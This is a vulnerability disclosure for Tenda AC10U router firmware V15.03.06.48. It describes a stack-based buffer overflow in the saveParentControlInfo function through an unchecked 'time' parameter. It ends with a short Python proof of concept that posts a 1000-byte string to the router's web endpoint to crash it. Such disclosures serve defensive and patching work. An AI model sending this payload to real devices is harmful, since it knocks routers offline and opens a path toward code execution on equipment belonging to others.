## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability.

![image-20240314123422079](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314123422079.png)

it reads in a user-provided parameter `time`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240314124203078](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314124203078.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240314124144187](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314124144187.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000


data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313183417783](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313183417783.png)
